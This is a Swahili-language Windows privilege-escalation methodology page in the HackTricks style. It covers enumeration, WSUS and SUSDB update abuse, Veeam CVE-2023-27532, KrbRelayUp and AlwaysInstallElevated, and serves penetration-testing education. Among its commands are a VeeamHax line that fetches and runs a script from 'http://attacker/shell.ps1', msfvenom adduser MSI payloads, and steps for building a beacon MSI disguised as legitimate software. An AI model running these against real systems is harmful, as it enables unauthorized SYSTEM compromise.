# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ukurasa huu unajumuisha mbinu za jumla za Windows privilege escalation kutoka kwenye miongozo kadhaa ya msingi.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Mtiririko wake wa vitendo wa enumeration pia unatokana na warsha na checklist za jamii.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Nyenzo za kihistoria kuhusu mashambulizi zinajumuisha wasilisho la DerbyCon kuhusu Windows privilege escalation.<sup>[[5]](#references)</sup>

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui access tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui integrity levels za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna mambo mbalimbali katika Windows yanayoweza **kukuzuia kuchunguza mfumo**, kuendesha executables au hata **kutambua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na **kuchunguza** **mbinu hizi zote za ulinzi** kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Ufikiaji wa kimwili unaweza pia kubadilisha uhariri wa UEFI NVRAM ukiwa offline kuwa msururu wa pre-boot DMA na Windows `SYSTEM` memory-patching:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

Michakato ya UIAccess inayoanzishwa kupitia `RAiLaunchAdminProcess` inaweza kutumiwa vibaya kufikia High IL bila maombi ya uthibitisho, endapo ukaguzi wa AppInfo secure-path umepitwa. Angalia utaratibu maalum wa UIAccess/Admin Protection bypass hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Usambazaji wa registry wa ufikivu wa Secure Desktop unaweza kutumiwa vibaya kufanya uandishi wa registry wowote wa SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Matoleo mapya ya Windows pia yameleta njia ya LPE ya **SMB arbitrary-port**, ambapo uthibitishaji wa NTLM wa ndani wenye mamlaka ya juu unaakisiwa kupitia muunganisho wa SMB TCP uliotumika tena:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Taarifa za Mfumo

### Enumeration ya taarifa za toleo

Angalia kama toleo la Windows lina udhaifu unaojulikana (pia kagua patches zilizotumika).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za Toleo

[Site hii](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta maelezo ya kina kuhusu vulnerabilities za usalama za Microsoft. Database hii ina zaidi ya vulnerabilities 4,700 za usalama, ikionyesha **eneo kubwa la mashambulizi** linaloletwa na mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — hukusanya taarifa kuhusu OS build, updates zilizosakinishwa, na advisory candidates zilizochaguliwa; hakiki product halisi na updates zinazochukua nafasi ya updates za awali kabla ya kudhani kuwa matokeo yanahusika.

Kwa local exploit inayohusiana na toleo maalum, angalia **usanifu wa process inayoendeshwa** pamoja na usanifu wa OS. Kwenye Windows ya 64-bit, process ya 32-bit huathiriwa na [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` kwa kawaida huelekeza kwenye system directory ya 32-bit, huku `%windir%\Sysnative` ikiipa process hiyo ufikiaji wa system directory asilia. Alias hii haipatikani kwa process ya 64-bit. OS build au candidate ya KB inayokosekana haithibitishi kuwa exploit inaweza kutumika; linganisha build inayoendeshwa, update iliyosakinishwa au inayochukua nafasi ya update ya awali, usanifu wa process, na masharti ya exploit na [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) ya issue husika.

**Kwa kutumia taarifa za mfumo kwenye kifaa**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Kuna credential au taarifa za Juicy zilizohifadhiwa kwenye env variables yoyote?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia ya PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuwasha kipengele hiki katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ni mfano tu. [Sera ya transcription ya PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) kwa kawaida huhifadhi faili katika folda ya Documents ya kila mtumiaji, lakini mipangilio ya `OutputDirectory` au `Start-Transcript -OutputDirectory` inaweza kuelekeza faili kwenye folda inayoshirikiwa au iliyofichwa. Kabla ya kukagua nakala ya shughuli, thibitisha njia halisi ya kuhifadhi na ACL za faili: inaweza kuwa na hoja za amri na matokeo, yakiwemo credentials. Nakala ya shughuli inayosomeka ni kidokezo tu ikiwa maudhui yake yanaonyesha utambulisho wa kiwango cha juu zaidi unaoweza kutumika, na utambulisho huo unaweza kuingia katika muktadha husika.

### PowerShell Module Logging

Maelezo ya utekelezaji wa pipeline ya PowerShell hurekodiwa, yakijumuisha amri zilizotekelezwa, miito ya amri na sehemu za scripts. Hata hivyo, huenda maelezo kamili ya utekelezaji na matokeo yake yasinaswe.

Ili kuwezesha hili, fuata maagizo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Ili kuona matukio 15 ya mwisho kutoka kwenye logi za PowersShell, unaweza kutekeleza:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script hunaswa, hivyo kuhakikisha kwamba kila block ya code inaandikwa inapotekelezwa. Mchakato huu huhifadhi rekodi ya kina ya ukaguzi ya kila shughuli, ambayo ni muhimu kwa uchunguzi wa kidijitali na kuchanganua tabia hasidi. Kwa kuandika shughuli zote wakati wa utekelezaji, maarifa ya kina kuhusu mchakato hupatikana.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Matukio ya logging ya Script Block yanaweza kupatikana katika Windows Event Viewer kwenye njia hii: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Kuonyesha matukio 20 ya mwisho, unaweza kutumia:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Mipangilio ya Intaneti

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Viendeshi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Endpoint ya HTTP ya WSUS ni kidokezo cha kuchunguza uwezekano wa kunasa metadata ya masasisho. Unyonyaji pia hutegemea kama mteja anatumia seva hiyo ya WSUS, kama mshambuliaji anaweza kunasa au kudhibiti trafiki yake, na sera za mteja kuhusu uaminifu wa masasisho na usakinishaji. URL pekee haithibitishi utekelezaji wa msimbo. [Microsoft inapendekeza TLS kwa metadata ya WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Unaanza kwa kukagua kama mtandao unatumia sasisho la WSUS lisilotumia SSL kwa kutekeleza amri ifuatayo kwenye cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Au yafuatayo katika PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ukipata jibu kama mojawapo ya haya:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Wakati `UseWUServer` ni `1`, Windows Update hutumia huduma ya intraneti iliyosanidiwa. Hii inathibitisha sharti la awali kwa njia ya kuingilia trafiki ya HTTP, lakini haithibitishi kwamba kuingilia trafiki, kukubaliwa kwa masasisho hasidi, au usakinishaji wenye ruhusa za juu kunawezekana. Ikiwa ni `0`, endpoint hii mahususi ya WSUS iliyosanidiwa haichaguliwi na sera hiyo.

Ili kutumia udhaifu huu unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za exploits za MiTM zilizotayarishwa kuingiza masasisho 'bandia' kwenye trafiki ya WSUS isiyotumia SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Kimsingi, huu ndio udhaifu unaotumiwa na hitilafu hii:

> Ikiwa tuna uwezo wa kurekebisha proxy ya mtumiaji wetu wa ndani, na Windows Updates inatumia proxy iliyosanidiwa katika mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ya mashine yetu ili kuingilia trafiki yetu wenyewe na kuendesha code kama mtumiaji mwenye ruhusa za juu kwenye kifaa chetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, pia itatumia certificate store yake. Tukitengeneza certificate iliyosainiwa yenyewe kwa jina la hostname la WSUS na kuongeza certificate hiyo kwenye certificate store ya mtumiaji wa sasa, tutaweza kuingilia trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mifumo inayofanana na HSTS kutekeleza uthibitishaji wa aina ya trust-on-first-use kwa certificate. Ikiwa certificate iliyowasilishwa inaaminika na mtumiaji na ina hostname sahihi, huduma itaikubali.

Unaweza kutumia udhaifu huu kwa kutumia zana ya [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (pindi itakapowekwa wazi).

### Masasisho yanayodhibitiwa na msimamizi wa WSUS

Njia tofauti ipo wakati utambulisho wa sasa unaweza **kuchapisha na kuidhinisha** masasisho kwenye seva ya WSUS. Kagua uanachama unaotumika wa kundi la `WSUS Administrators` la seva na ruhusa zozote za WSUS zilizokasimiwa, kisha tambua kundi la kompyuta za wateja ambalo lingepokea sasisho lililoidhinishwa. [Microsoft inahitaji ruhusa za WSUS Administrator ili kuidhinisha masasisho](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), na [inaandika uhusiano wa uaminifu wa uchapishaji](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): wateja lazima waamini certificate ya kusaini inayotumiwa kwa maudhui yaliyochapishwa ndani. Thibitisha kwamba sasisho husika limesainiwa na kukubaliwa, linatumika kwa lengo husika, na linasakinishwa katika muktadha wenye ruhusa za juu zaidi kabla ya kulichukulia kama njia ya kupandisha ruhusa. Thamani ya HTTP `WUServer` au jina la kundi pekee havithibitishi masharti hayo.

### Matumizi mabaya ya sasisho maalum la SUSDB: payload zisizosainiwa kupitia `.txt`/`.esd`

Huu ni ukiukaji tofauti wa mpaka wa uaminifu na kuingilia muunganisho wa HTTP wa WSUS: sharti la awali ni kuwa na ufikiaji wa kutosha kwa **stored procedures za database ya WSUS (`SUSDB`)** ili kuchapisha na kuidhinisha sasisho maalum. Njia moja ya kuingia inayoweza kutumika ni kupeleka tena akaunti ya kompyuta ya WSUS ya upstream kwenye seva tofauti ya MSSQL inayohifadhi `SUSDB`; sharti halisi hutegemea usanidi, kwa hivyo kwanza orodhesha ruhusa za `EXECUTE` badala ya kudhani una haki za SQL administrator.<sup>[[38]](#references)[[39]](#references)</sup>

Kwa njia tofauti ya mashambulizi inayopeleka tena uthibitishaji wa mteja wa WSUS kutoka HTTP/8530 hadi LDAP, SMB, au AD CS, angalia [Kutumia vibaya HTTP ya WSUS kwa NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Tengeneza, lenga na uidhinishe sasisho

Mchakato wa sasisho maalum hutumia taratibu halali za WSUS kama API yenye vizuizi ya kuchapisha. Mabadiliko muhimu ya hali ni:<sup>[[38]](#references)</sup>

| Hatua | Stored procedures husika |
| --- | --- |
| Ingiza metadata ya sasisho | `spImportUpdate` |
| Hifadhi vipande vya XML vya masharti ya awali, vya lugha maalum na vilivyopanuliwa | `spSaveXMLFragment` |
| Husisha digest ya maudhui na URL inayodhibitiwa na mshambuliaji | `spSetBatchURL` |
| Orodhesha/tengeneza kundi la kompyuta na uongeze mteja | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Idhinisha usakinishaji kwa kundi hilo | `spDeployUpdate` pamoja na `@actionID = 0` na `@isAssigned = 1` |

Jina la faili, digest, ukubwa na handler ya `CommandLineInstallation` lazima zilingane katika metadata/vipande vilivyoingizwa. Baada ya kuweka URL ya maudhui na kundi lengwa, idhini ya mwisho hufanana na ifuatayo; tumia vitambulishi vipya vya sasisho, kundi na deployment badala ya kutumia tena GUID za mfano.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Bypass ya signature inayotegemea extension

WSUS kwa kawaida hukataa maudhui ya executable yasiyotiwa saini kiholela. Hata hivyo, katika `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, njia ya .NET `VerifyFile` huweka bendera ya ukaguzi wa certificate kuwa false jina la faili lililotolewa linapoishia na `.txt` au `.esd`; kisha `CheckCertificateSignature` hurukwa bila kuthibitisha kwanza kwamba byte ni maandishi au picha halali ya ESD. Kwa hiyo, PE isiyobadilishwa inayoitwa, kwa mfano, `payload.exe.txt` inaweza kupita uthibitishaji wa maudhui na baadaye kuzinduliwa na handler ya usakinishaji wa command-line ya update. Hili ni hitilafu ya sera/aina (type-confusion), si kughushi signature.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging na automation zinazoendana na BITS

Kuita `spDeployUpdate` hufanya WSUS ichukue maudhui yaliyosajiliwa. Origin lazima itimize matarajio ya BITS kuhusu HTTP: kuwa na URL inayofikika pekee hakutoshi, kwa sababu uhamishaji hutumia mtiririko wa awali wa `HEAD`/`GET` na maombi ya byte-range. Seva isiyoauni Range husababisha tukio la WSUS la ulandanishi `EventId=364`, linalosema kuwa BITS inahitaji kichwa cha itifaki ya Range.<sup>[[39]](#references)</sup>

PoC ya utafiti [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) hutengeneza SQL inayohitajika kwa mnyororo wa import/fragment/URL/group/deployment, inajumuisha mteja wa MSSQL uliorekebishwa kwa ajili ya kuitekeleza, na inatoa `BitsWebServer.py` kwa ajili ya staging ya maudhui. Mfano wa chini kabisa wa matumizi katika maabara iliyoidhinishwa ni:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Utekelezaji bila uangalizi na persistence ya kujaribu tena

Mwingiliano wa upande wa client hutegemea sera. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, chaguo `4 - Auto download and schedule install`, husababisha update iliyoidhinishwa kupakuliwa na kusakinishwa kwa ratiba iliyosanidiwa bila mtumiaji kuichagua mwenyewe. Katika majaribio, payload ambayo update yake ilibaki imeshindwa/kukamilika kwa sehemu ilitolewa tena mara tu mchakato wa callback ulipotoka, hivyo tabia ya kujaribu tena inaweza kuwa persistence ya utekelezaji unaojirudia; inaacha dalili nyingi kwa sababu client huonyesha hali ya update iliyoshindwa.<sup>[[39]](#references)</sup>

#### Mielekeo ya ugunduzi na uimarishaji

Mielekeo muhimu ya upande wa server na client kutoka kwenye chain hii ni:<sup>[[39]](#references)</sup>

- Kagua utekelezaji wa `spCreateTargetGroup`, `spSetBatchURL` na `spDeployUpdate` kwenye `SUSDB`; chunguza target groups mpya, vyanzo vya maudhui vya nje, payload za update za `.txt`/`.esd` na deployments zilizofanywa na principals zisizotarajiwa (hasa akaunti zisizo za kompyuta).
- Kagua `C:\Program Files\Update Services\LogFiles` ili kupata `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` (imeandikwa kimakosa), na `EventId=364`; linganisha verification na kiendelezi cha payload pamoja na content magic badala ya kuamini kiambishi tamati.
- Tafuta hali za usakinishaji wa Windows Update kushindwa/kujaribu tena mara kwa mara, pamoja na utekelezaji wa PE au shughuli zisizotarajiwa za child/network kutoka kwa maudhui yenye majina ya `.txt` au `.esd`.
- Inapowezekana, hitaji Extended Protection for Authentication kwenye huduma ya database, na zuia ufikiaji wa mtandao wa database kwa server ya WSUS na mifumo ya usimamizi iliyoidhinishwa pekee. Punguza na kagua haki za `EXECUTE` kwenye procedures za custom-update.

## Visasishaji vya Kiotomatiki vya Watoa Huduma Wengine na Agent IPC (local privesc)

Agents wengi wa enterprise huweka uso wa IPC wa localhost na channel ya update yenye privileges za juu. Ikiwa enrollment inaweza kulazimishwa kuwasiliana na server ya mshambuliaji na updater inaamini root CA hasidi au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kuwasilisha MSI hasidi ambayo huduma ya SYSTEM husakinisha. Tazama mbinu ya jumla (inayotokana na chain ya Netskope stAgentSvc – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM kupitia TCP 9401)

Veeam Backup & Replication na Cloud Connect hutumia huduma kuu ya backup kwenye **TCP/9401 kwa chaguomsingi**. [Veeam's advisory](https://www.veeam.com/kb4424) inaeleza ufichuaji usiohitaji uthibitishaji wa credentials zilizosimbwa za hifadhidata ya usanidi ndani ya mipaka ya mtandao wa backup; PoC tofauti ya umma inaonyesha njia ya kutekeleza amri kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Huduma inaweza kufungamana na anwani nyingine zaidi ya localhost, kwa hiyo kagua anwani yake halisi na PID.

- **Upelelezi**: thibitisha kuwa TCP/9401 inamilikiwa na `Veeam.Backup.Service.exe`, kisha kagua bidhaa iliyosakinishwa na metadata ya patch. `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ni vidokezo, si ukaguzi kamili wa patch.
- **Matoleo ya chini yaliyorekebishwa**: Veeam inaorodhesha **11a build 11.0.1.1261 P20230227** na **12 build 12.0.0.1420 P20230223** kama matoleo ya kwanza yaliyorekebishwa; matoleo ya awali yameathirika. File version yenye sehemu nne pekee haiwezi kutofautisha build ya msingi isiyo na patch na patch ya baadaye kwenye namba hizo hizo za build. Thibitisha kitambulisho cha patch dhidi ya [vendor build history](https://www.veeam.com/kb2680) kabla ya kusema kuwa build ya mpaka imerekebishwa.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na DLL za Veeam zinazohitajika kwenye directory moja, kisha anzisha payload ya SYSTEM kupitia socket ya ndani:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

PoC iliyotajwa inaonyesha command execution kama SYSTEM ikiwa masharti yake ya ziada yametimizwa; advisory ya vendor inaeleza suala la kufichuliwa kwa credential.
## KrbRelayUp

Kerberos relay ya ndani inaweza kutoka kwenye logon yenye privilege ndogo hadi kwenye uandishi wa directory wenye privilege ya juu, pale COM server inayofaa inapofanya authentication na principal inayorelayiwa ikiwa na ruhusa kwenye object lengwa. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) uandishi wa LDAP wa RBCD na `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp huendesha kiotomatiki baadhi ya njia hizi. Mlolongo wa RBCD unahitaji delegation inayotumika na ruhusa kwenye object lengwa, huku mlolongo wa shadow-credential ukihitaji ruhusa za kuandika key-credential na KDC inayotumia njia ya certificate authentication. Hakuna njia kati ya hizi inayotokana na kuwa mwanachama wa domain pekee.

Kagua sera halisi ya DC kuhusu [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) na [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), object ACL ya utambulisho unaorelayiwa, na viwango vya authentication na impersonation vya COM class iliyochaguliwa. Aina ya logon ya caller na muktadha wa credential ni muhimu: session ya WinRM inaweza kutenda tofauti na logon ya interactive au new-credentials. Firewall/OXID routing na updates zilizowekwa pia zinaweza kubadili matokeo. Chukulia sera inayoruhusu au ACL inayolingana kama mambo yanayofaa kukaguliwa; enumeration isiyoingilia mfumo haipaswi kusababisha COM coercion, relay authentication au uandishi wa directory. Shadow credential ya machine account inaweza kusababisha machine ticket na, ikiwa tu akaunti hiyo ina ruhusa zinazohitajika za directory replication, njia tofauti ya DCSync.

Tafuta **exploit katika** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa shambulio, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ikiwa** registry keys hizi 2 **zimewezeshwa** (thamani ni **0x1**), basi watumiaji wa privilege yoyote wanaweza **kusakinisha** (execute) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ikiwa una session ya meterpreter, unaweza kufanya mbinu hii kiotomatiki kwa kutumia moduli **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri ya `Write-UserAddMSI` kutoka power-up ili kuunda ndani ya saraka ya sasa binary ya Windows MSI ya kuongeza privileges. Script hii huandika installer ya MSI iliyokompailiwa mapema, ambayo huomba kuongeza user/group (kwa hiyo utahitaji ufikiaji wa GIU):

```
Write-UserAddMSI
```

Tekeleza tu binary iliyoundwa ili kuongeza privileges.

### MSI Wrapper

Soma mafunzo haya ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia zana hizi. Kumbuka kuwa unaweza kufunga faili ya "**.bat**" ikiwa **unataka tu** **kutekeleza** **mistari ya amri**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Unda MSI kwa WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Unda MSI kwa Visual Studio

- **Tengeneza** Windows EXE TCP payload **mpya** kwa Cobalt Strike au Metasploit katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" kwenye kisanduku cha kutafuta. Chagua mradi wa **Setup Wizard** na ubofye **Next**.
- Ipe mradi jina, kama vile **AlwaysPrivesc**, tumia **`C:\privesc`** kama eneo, chagua **place solution and project in the same directory**, kisha ubofye **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 kati ya 4 (chagua faili za kujumuisha). Bofya **Add** na uchague Beacon payload uliyotengeneza hivi punde. Kisha ubofye **Finish**.
- Angazia mradi wa **AlwaysPrivesc** katika **Solution Explorer** na kwenye **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
  - Kuna properties nyingine unazoweza kubadilisha, kama vile **Author** na **Manufacturer**, ili kufanya programu iliyosakinishwa ionekane halali zaidi.
- Bofya kulia mradi na uchague **View > Custom Actions**.
- Bofya kulia **Install** na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** na ubofye **OK**. Hii itahakikisha kuwa beacon payload inatekelezwa mara tu kisakinishi kinapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwishowe, **ijenge**.
  - Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonekana, hakikisha umeweka platform kuwa x64.

### Usakinishaji wa MSI

Ili kutekeleza **usakinishaji** wa faili hasidi ya `.msi` **chinichini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Ili kutumia udhaifu huu, unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vifuatiliaji

### Mipangilio ya Ukaguzi

Mipangilio hii huamua kinachokuwa **kinawekwa kwenye kumbukumbu**, kwa hivyo unapaswa kuizingatia.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, inafurahisha kujua logi zinatumwa wapi.
